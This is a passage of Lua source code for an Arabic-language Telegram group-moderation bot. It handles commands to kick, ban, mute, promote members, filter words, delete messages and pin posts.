◖'..lock_self..   '◗\n'..'🚷*¦* الماركدون بالتقيد  ◖'..lock_mark..   '◗\n'..'🚷*¦* الكلايش بالتقيد  ◖'..lock_spam..   '◗\n'..'🚷*¦* اللستات بالتقيد  ◖'..lock_inlin..   '◗\n'..'🚷*¦* الصوت بالتقيد  ◖'..lock_vico..   '◗\n'..'🚷*¦* المتحركه بالتقيد  ◖'..lock_gif..   '◗\n'..'🚷*¦* الملفات بالتقيد  ◖'..lock_file..   '◗\n'..'🚷*¦* الفيديو بالتقيد  ◖'..lock_ved..   '◗\n'..'🚷*¦* الالعاب بالتقيد  ◖'..lock_geam..   '◗\n'..'🚷*¦* الصور بالتقيد  ◖'..lock_photo..   '◗\n'..'🚷*¦* الاغاني بالتقيد  ◖'..lock_muse..   '◗\n'..'🚷*¦* الملصقات بالتقيد  ◖'..lock_ste..   '◗\n'..'🚷*¦* الجهات بالتقيد  ◖'..lock_phon..   '◗\n*•——•🔸•۪۫•৩﴾ > 🍂 < ﴿৩•۪۫•🔸•——•*\n'   storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')    end   
if text and text:match('^ضع تكرار (%d+)$') and is_mod(msg) then tahadevstorm:hset("flooding:settings:"..msg.chat_id_ ,"floodmax" ,text:match('ضع تكرار (.*)')) storm_sendMsg(msg.chat_id_, msg.id_, 1,'💥*¦*  تم وضع عدد التكرار في المجموعه ( '..text:match('ضع تكرار (.*)')..' )', 1, 'md') end if text and text:match('^ضع زمن التكرار (%d+)$') and is_mod(msg) then tahadevstorm:hset("flooding:settings:"..msg.chat_id_ ,"floodtime" ,text:match('ضع زمن التكرار (.*)')) storm_sendMsg(msg.chat_id_, msg.id_, 1,'💥*¦*  تم وضع زمن التكرار في المجموعه ( '..text:match('ضع زمن التكرار (.*)')..' )', 1, 'md') end
if text == 'الترحيب' then local tahalink = tahadevstorm:get(DEVSTOR..'welcome:'..msg.chat_id_)  if tahalink then storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..tahalink..'', 1, 'html') else storm_sendMsg(msg.chat_id_, msg.id_, 1, '*📛¦* عذرا لم يتم وضع الترحيب \n', 1, 'md') end end
if text == 'طرد' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg)   then function kick_by_reply(extra, result, success) if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else kickm(msg,msg.chat_id_,result.sender_user_id_) end end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply) end
if text and text:match('^طرد (%d+)') and is_mod(msg)  then local user = text:match('طرد (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..'' if tonumber(user) == tonumber(bot_id) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')  return false  end if storm1(msg.chat_id_,user) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع حظر وكتم وطرد وتقيد ال(مدراء او الادمنيه او المميزين) 💢*', 1, 'md') else  if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تــم طــرده بـنجـاح'  storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md') changeChatMemberStatus(msg.chat_id_, user, "Kicked") end end end getUser(user, bot_kick) end
if text and text:match('^طرد @(.*)') and is_mod(msg)   then local username = text:match('طرد @(.*)') function kick_username(extra,result,success) if result.id_ then  if tonumber(result.id_) == tonumber(bot_id) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')  return false  end if storm1(msg.chat_id_,result.id_) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع حظر وكتم وطرد وتقيد ال(مدراء او الادمنيه او المميزين) 💢*', 1, 'md') else if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تــم طــرده بـنجـاح'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md')   end end changeChatMemberStatus(msg.chat_id_, result.id_, "Kicked") end end saddbyusername(username,kick_username) end
if text == 'حظر' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg)   then function banreply(extra, result, success) if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else ban(msg,msg.chat_id_,result.sender_user_id_) end end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),banreply) end
if text and text:match('^حظر (%d+)') and is_mod(msg) then local user = text:match('حظر (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..'' if tonumber(user) == tonumber(bot_id) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')  return false  end if storm1(msg.chat_id_,user) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع حظر وكتم وطرد وتقيد ال(مدراء او الادمنيه او المميزين) 💢*', 1, 'md') else if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else tahadevstorm:sadd(DEVSTOR..'storm:baned'..msg.chat_id_,user)   zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تــم حـظره بـنجـاح' storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')  changeChatMemberStatus(msg.chat_id_, user, "Kicked")  end end end getUser(user, bot_kick) end
if text and text:match('^حظر @(.*)') and is_mod(msg)   then local username = text:match('حظر @(.*)') function banusername(extra,result,success) if result.id_ then   if tonumber(result.id_) == tonumber(bot_id) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')  return false  end if storm1(msg.chat_id_,result.id_) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع حظر وكتم وطرد وتقيد ال(مدراء او الادمنيه او المميزين) 💢*', 1, 'md') else if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else tahadevstorm:sadd(DEVSTOR..'storm:baned'..msg.chat_id_,result.id_)   zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تــم حـظره بـنجـاح'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') end end  changeChatMemberStatus(msg.chat_id_, result.id_, "Kicked")   end  end saddbyusername(username,banusername) end
if text == 'الغاء الحظر' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then function unbanreply(extra, result, success) if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else unban(msg,msg.chat_id_,result.sender_user_id_) end end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) end
if text and text:match('^الغاء الحظر (%d+)') and is_mod(msg) then local user = text:match('الغاء الحظر (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..'' if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else tahadevstorm:srem(DEVSTOR..'storm:baned'..msg.chat_id_,user)    zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تــم الــغاء حـظره بـنجـاح' storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md') end changeChatMemberStatus(msg.chat_id_, user, "Left")   end getUser(user, bot_kick) end
if text and text:match('^الغاء الحظر @(.*)') and is_mod(msg) then  local username = text:match('الغاء الحظر @(.*)')  function unbanusername(extra,result,success)  if result.id_ then if not msg.can_be_deleted_ == true then  storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")  else  tahadevstorm:srem(DEVSTOR..'storm:baned'..msg.chat_id_,result.id_)  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تــم الــغاء حـظره بـنجـاح'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md')  end changeChatMemberStatus(msg.chat_id_, result.id_, "Left")  end  end  saddbyusername(username,unbanusername) end 
if text == 'المحظورين' and is_mod(msg) then local list = tahadevstorm:smembers(DEVSTOR..'storm:baned'..msg.chat_id_)local t = '*📊¦ قائمه المحظورين في المجموعه 🍂*\n*ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n' for k, v in pairs(list) do if tahadevstorm:hget('users:'..v, 'uname') then t = t..'*◖'..k.."◗➣* [" ..get_username(v).."]\n"  else  t = t..'*◖'..k.."◗➣* `" ..(v).."`\n" end  end if #list == 0 then t = '*📬¦* لا يوجد محظورين في هاذه المجموعه' end storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') end  
if text == 'مسح المحظورين' and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'storm:baned'..msg.chat_id_) storm_sendMsg(msg.chat_id_, msg.id_, 1,'*📬¦* تم مسح المحظورين', 1, 'md') end 
if text == 'رفع مميز' and is_mod(msg) then    function vippyrep(extra, result, success)   vipgroups(msg,msg.chat_id_,result.sender_user_id_)    end  if tonumber(msg.reply_to_message_id_) == 0 then  else    getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),vippyrep)   end  end
if text and text:match('^رفع مميز @(.*)') and is_mod(msg) then  local username = text:match('^رفع مميز @(.*)') function vippyrep(extra,result,success)   if result.id_ then  tahadevstorm:sadd(DEVSTOR..'vip:group'..msg.chat_id_,result.id_)  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تــم تـرقيتـه مميــز' else  ze = ' ◗♻¦ حاول مره اخره لو سمحت '    end  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md')         end  saddbyusername(username,vippyrep) end
if text and text:match('^رفع مميز (%d+)') and is_mod(msg) then local user = text:match('رفع مميز (%d+)')  function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..'' tahadevstorm:sadd(DEVSTOR..'vip:group'..msg.chat_id_,user) zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تــم تـرقيتـه مميــز' storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')  end getUser(user, bot_kick) end
if text ==('تنزيل مميز') and is_mod(msg) then function prom_reply(extra, result, success) demvipgroups(msg,msg.chat_id_,result.sender_user_id_) end if tonumber(msg.reply_to_message_id_) == 0 then else getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)   end end
if text and text:match('^تنزيل مميز @(.*)') and is_mod(msg) then local username = text:match('^تنزيل مميز @(.*)')  function vippyrep(extra,result,success)   if result.id_ then  tahadevstorm:srem(DEVSTOR..'vip:group'..msg.chat_id_,result.id_)  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تــم تـنزيلــه مــن  المميــزيـن' else  ze = ' ◗♻¦ حاول مره اخره لو سمحت '  end  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md')  end saddbyusername(username,vippyrep) end
if text and text:match('^تنزيل مميز (%d+)') and is_mod(msg) then local user = text:match('تنزيل مميز (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''   tahadevstorm:srem(DEVSTOR..'vip:group'..msg.chat_id_,user) zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تــم تـنزيلــه مــن  المميــزيـن' storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')  end getUser(user, bot_kick) end
if text == 'المميزين' and is_mod(msg) then  local list = tahadevstorm:smembers(DEVSTOR..'vip:group'..msg.chat_id_) local t = '*📊¦ قائمه المميزين في المجموعه ✨*\n*ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n' for k, v in pairs(list) do if tahadevstorm:hget('users:'..v, 'uname') then t = t..'*◖'..k.."◗➣* [" ..get_username(v).."]\n"  else  t = t..'*◖'..k.."◗➣* `" ..(v).."`\n" end  end if #list == 0 then t = '*📬¦* لا يوجد مميزين في هاذه المجموعه' end storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') end 
if text == 'مسح المميزين' and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'vip:group'..msg.chat_id_) storm_sendMsg(msg.chat_id_, msg.id_, 1,'💥*¦*  تم مسح المميزين', 1, 'md') end 
if text == 'رفع مميز عام' and is_devtaha(msg) then function vippyrep(extra, result, success) tahadevstorm:sadd(DEVSTOR..'vip:groups',result.sender_user_id_)    zo = '*◗📛¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗💠¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📬¦* تـم تـرقيـته ممــيز عــام'  storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')  end    if tonumber(msg.reply_to_message_id_) == 0 then    else     getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),vippyrep)       end  end
if text and text:match('^رفع مميز عام @(.*)') and is_devtaha(msg) then     local username = text:match('^رفع مميز عام @(.*)')  function vippyuser(extra,result,success)   if result.id_ then   tahadevstorm:sadd(DEVSTOR..'vip:groups',result.id_)   zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تـم تـرقيـته ممــيز عــام' else  ze = ' ◗♻¦ حاول مره اخره لو سمحت '    end    storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')     end    saddbyusername(username,vippyuser)  end
if text and text:match('^رفع مميز عام (%d+)') and is_devtaha(msg) then     local user = text:match('رفع مميز عام (%d+)')  function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''  tahadevstorm:sadd(DEVSTOR..'vip:groups',user)  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تـم تـرقيـته ممــيز عــام' storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')  end getUser(user, bot_kick) end
if text == 'تنزيل مميز عام' and is_devtaha(msg) then   function vippyrep(extra, result, success)   tahadevstorm:srem(DEVSTOR..'vip:groups',result.sender_user_id_)   zo = '*◗📛¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗💠¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📬¦* تــم تـنزيلــه مــن  المميــزيـن العام' storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')   end   if tonumber(msg.reply_to_message_id_) == 0 then    else  getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),vippyrep)      end   end   
if text and text:match('^تنزيل مميز عام @(.*)') and is_devtaha(msg) then  local username = text:match('^تنزيل مميز عام @(.*)')   function vippyrep(extra,result,success)  if result.id_ then  tahadevstorm:srem(DEVSTOR..'vip:groups',result.id_) zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تــم تـنزيلــه مــن  المميــزيـن العام' else  ze = ' ◗♻¦ حاول مره اخره لو سمحت '   end  storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')    end  saddbyusername(username,vippyrep)   end  
if text and text:match('^تنزيل مميز عام (%d+)') and is_devtaha(msg) then   local user = text:match('تنزيل مميز عام (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''  tahadevstorm:srem(DEVSTOR..'vip:groups',user) zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تــم تـنزيلــه مــن  المميــزيـن العام' storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md') end getUser(user, bot_kick) end
if text == 'المميزين عام' and is_devtaha(msg) then  local list = tahadevstorm:smembers(DEVSTOR..'vip:groups') local t = '*📊¦ قائمه المميزين عام 🍃 *\n*ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n' for k, v in pairs(list) do if tahadevstorm:hget('users:'..v, 'uname') then t = t..'*◖'..k.."◗➣* [" ..get_username(v).."]\n"  else  t = t..'*◖'..k.."◗➣* `" ..(v).."`\n"  end  end if #list == 0 then t = '*📬¦* لا يوجد مميزين عام في هاذه المجموعه' end storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') end 
if text == 'كتم' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then function mutereply(extra, result, success) mute(msg,msg.chat_id_,result.sender_user_id_) end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),mutereply) end
if text and text:match('^كتم (%d+)') and is_mod(msg) then  local user = text:match('كتم (%d+)')  function bot_kick(extra, result, success)  username = ''..(result.username_ or ' لم يضع معرف ✨')..''  if tonumber(user) == tonumber(bot_id) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')   return false  end  if storm1(msg.chat_id_,user) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع حظر وكتم وطرد وتقيد ال(مدراء او الادمنيه او المميزين) 💢*', 1, 'md') return false  end   tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,user)   zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تـم كــتمه بنجــاح'  storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')  end getUser(user, bot_kick) end   
if text and text:match('^كتم @(.*)') and is_mod(msg)   then local username = text:match('كتم @(.*)') function muteusername(extra,result,success) if result.id_ then  if tonumber(result.id_) == tonumber(bot_id) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')  return false  end  if storm1(msg.chat_id_,result.id_) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع حظر وكتم وطرد وتقيد ال(مدراء او الادمنيه او المميزين) 💢*', 1, 'md') else   zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تـم كــتمه بنجــاح'  tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,result.id_)  end end storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') end saddbyusername(username,muteusername) end 
if text == 'الغاء الكتم' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then function unmutereply(extra, result, success) unmute(msg,msg.chat_id_,result.sender_user_id_) end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unmutereply) end  
if text and text:match('^الغاء الكتم (%d+)') and is_mod(msg) then  local user = text:match('الغاء الكتم (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..'' tahadevstorm:srem(DEVSTOR..'mutes'..msg.chat_id_,user)  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تـم كــتمه بنجــاح' storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md') end getUser(user, bot_kick) end
if text and text:match('^الغاء الكتم @(.*)') and is_mod(msg) then local username = text:match('الغاء الكتم @(.*)') function unmuteusername(extra,result,success) if result.id_ then tahadevstorm:srem(DEVSTOR..'mutes'..msg.chat_id_,result.id_) zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تـم الــغاء كــتمه بنجــاح'   else zo = ' ◗♻¦ حاول مره اخره لو سمحت '    end  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md')  end saddbyusername(username,unmuteusername) end 
if text == 'المكتومين' and is_mod(msg) then if not tahadevstorm:get(DEVSTOR.."lock:add"..msg.chat_id_) then local list = tahadevstorm:smembers(DEVSTOR..'mutes'..msg.chat_id_) local t = '*📊¦* قائمه مكتومين المجموعه ✨\n*ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n' for k, v in pairs(list) do if tahadevstorm:hget('users:'..v, 'uname') then t = t..'*◖'..k.."◗➣* [" ..get_username(v).."]\n"  else  t = t..'*◖'..k.."◗➣* `" ..(v).."`\n"  end  end if #list == 0 then t = '*📬¦* لا يوجد مكتومين في هاذه المجموعه' end storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md')       end end
if text == ('مسح المكتومين') and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'mutes'..msg.chat_id_) storm_sendMsg(msg.chat_id_, msg.id_, 1,'*📬¦* تم مسح المكتومين', 1, 'md') end end
if text == 'رفع القيود' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then function unbanreply(extra, result, success) if tonumber(result.sender_user_id_) == tonumber(bot_id) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ هاذا بوت لا تستطيع رفع قيوده 💢*', 1, 'md')   return false  end  if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else  zo = '*◗📛¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗💠¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📬¦* تـم الغاء الكتم و الحظر والتقيد عنه'  tahadevstorm:srem(DEVSTOR..'storm:baned'..msg.chat_id_,result.sender_user_id_)  HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  tahadevstorm:srem(DEVSTOR..'tedmembars'..msg.chat_id_,result.sender_user_id_) tahadevstorm:srem(DEVSTOR..'mutes'..msg.chat_id_,result.sender_user_id_) storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')  end changeChatMemberStatus(msg.chat_id_, result.sender_user_id_, "Left")   end  getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) end
if text and text:match('^رفع القيود (%d+)') and is_mod(msg) then local user = text:match('رفع القيود (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''  if tonumber(user) == tonumber(bot_id) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ هاذا بوت لا تستطيع رفع قيوده 💢*', 1, 'md')   return false  end  if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else tahadevstorm:srem(DEVSTOR..'storm:baned'..msg.chat_id_,user)  HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  tahadevstorm:srem(DEVSTOR..'tedmembars'..msg.chat_id_,user)   zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تـم الغاء الكتم و الحظر والتقيد عنه' tahadevstorm:srem(DEVSTOR..'mutes'..msg.chat_id_,user)   storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md') end changeChatMemberStatus(msg.chat_id_, user, "Left")   end getUser(msg.sender_user_id_, bot_kick) end
if text and text:match('^رفع القيود @(.*)') and is_mod(msg) then  local username = text:match('رفع القيود @(.*)')  function unbanusername(extra,result,success)  if result.id_ then if tonumber(result.id_) == tonumber(bot_id) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ هاذا بوت لا تستطيع رفع قيوده 💢*', 1, 'md')   return false  end if not msg.can_be_deleted_ == true then  storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")  else  tahadevstorm:srem(DEVSTOR..'storm:baned'..msg.chat_id_,result.id_) zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تـم الغاء الكتم و الحظر والتقيد عنه' tahadevstorm:srem(DEVSTOR..'mutes'..msg.chat_id_,result.id_)  HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") tahadevstorm:srem(DEVSTOR..'tedmembars'..msg.chat_id_,result.id_) storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md')  end changeChatMemberStatus(msg.chat_id_, result.id_, "Left")  end  end  saddbyusername(username,unbanusername) end 
if text and text:match('^مسح (%d+)$') and is_monsh(msg) then  local taha = tonumber(text:match('^مسح (%d+)$')) if taha > 100 then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*📬¦* تستطيح المسح للعدد 100 فقط •', 1, 'md') else function cb(a,b,c) local msgs = b.messages_  for i=1 , #msgs do delete_msg(msg.chat_id_,{[0] = b.messages_[i].id_}) end end getChatHistory(msg.chat_id_, 0, 0, taha + 1,cb) storm_sendMsg(msg.chat_id_, msg.id_, 1,'☑*¦* تم مسح *{'..taha..'}* رساله في المجموعه', 1, 'md') end end  if tonumber(msg.reply_to_message_id_) > 0 then
if text==("حذف") and is_mod(msg) then delete_msg(msg.chat_id_,{[0] = tonumber(msg.reply_to_message_id_),msg.id_}) end	 end
if text and text:match('^منع (.*)') and is_mod(msg) then local taha = text:match('^منع (.*)') tahadevstorm:sadd(DEVSTOR..'filters:'..msg.chat_id_,taha) storm_sendMsg(msg.chat_id_, msg.id_, 1,'*📑¦* الكلمه ◗`'..taha..'`◖\n*📛¦* تم منعها في المجموعه بنجاح ✔\n', 1, 'md') end 
if text and text:match('^الغاء المنع (.*)')  and is_mod(msg) then  local taha = text:match('^الغاء المنع (.*)') tahadevstorm:srem(DEVSTOR..'filters:'..msg.chat_id_,taha) storm_sendMsg(msg.chat_id_, msg.id_, 1,'*📑¦* الكلمه ◗`'..taha..'`◖\n*📛¦* تم الغاء منعها بنجاح ✔\n', 1, 'md') end 
if text and text:match('^الغاء منع (.*)')  and is_mod(msg) then  local taha = text:match('^الغاء منع (.*)') tahadevstorm:srem(DEVSTOR..'filters:'..msg.chat_id_,taha) storm_sendMsg(msg.chat_id_, msg.id_, 1,'*📑¦* الكلمه ◗`'..taha..'`◖\n*📛¦* تم الغاء منعها بنجاح ✔\n', 1, 'md') end 
if text ==('مسح قائمه المنع') and is_mod(msg) then tahadevstorm:del(DEVSTOR..'filters:'..msg.chat_id_) storm_sendMsg(msg.chat_id_, msg.id_, 1,'📇*¦* تم مسح قائمه المنع', 1, 'md') end 
if text == ('قائمه المنع') and is_mod(msg) then  local list = tahadevstorm:smembers(DEVSTOR..'filters:'..msg.chat_id_) local t = '*📋¦* قائمه منع الكلمات 🍂 \n\n' for k,v in pairs(list) do t = t..'*◗'..k.."◖ { * `"..v.."` *}* \n*ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n"  end if #list == 0 then t = '*🚨¦* قائمه المنع فارغه' end storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') end 
if text ==('تثبيت') and msg.reply_to_message_id_ ~= 0 and is_mod(msg) then  if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else  local id = msg.id_ local msgs = {[0] = id}  pin(msg.chat_id_,msg.reply_to_message_id_,1)  timstoop(c,6) storm_sendMsg(msg.chat_id_, msg.reply_to_message_id_, 1, "*💭¦* ◗ الـرسالــه تــم تثـبيتهـا ◖\n", 1, 'md')  end end
